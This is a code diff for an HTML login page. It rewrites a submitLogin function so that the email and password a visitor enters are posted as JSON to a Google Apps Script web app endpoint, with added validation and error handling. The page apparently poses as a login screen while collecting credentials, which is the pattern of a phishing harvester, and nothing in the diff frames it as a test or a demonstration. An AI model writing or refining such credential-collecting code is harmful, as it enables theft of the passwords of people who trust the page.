@@ -45,26 +45,49 @@
   </div>
 
   <script>
-  function submitLogin() {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+    async function submitLogin() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
-    fetch("https://script.google.com/macros/s/AKfycbzfWwkEfWzdJWQ6kwBevUOIri45358xNKzwAGfUJCMIevUvdksPR9fEQba802n0drH7/exec", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ email, password })
-    })
-    .then(res => res.json())
-    .then(data => {
-      alert("Login data submitted!");
-    })
-    .catch(err => {
-      alert("Error submitting login data.");
-      console.error(err);
-    });
-  }
-</script>
+      // Replace with your Google Apps Script web app URL
+      const webAppUrl = "https://script.google.com/macros/s/AKfycbw9pzPEx4N5b59Tt0akfiiFgtk27seFyMfLlidFiwGNspqSpIkoRnZGgQxJ8OkGRKMK8g/exec"; // Update this after deploying the script
+
+      try {
+        // Validate inputs
+        if (!email || !password) {
+          throw new Error("Email and password are required");
+        }
+
+        const response = await fetch(webAppUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ email, password }),
+          mode: "cors",
+          redirect: "follow"
+        });
+
+        if (!response.ok) {
+          const errorText = await response.text();
+          throw new Error(`HTTP error! Status: ${response.status} ${response.statusText}. Details: ${errorText}`);
+        }
+
+        const data = await response.json();
+        if (data.status === "success") {
+          alert("Login data submitted successfully!");
+        } else {
+          throw new Error(data.message || "Server returned an error");
+        }
+      } catch (err) {
+        console.error("Fetch error details:", {
+          message: err.message,
+          name: err.name,
+          stack: err.stack
+        });
+        alert(`Error submitting login data: ${err.message || "Unknown error occurred"}`);
+      }
+    }
+  </script>
 </body>
 </html>
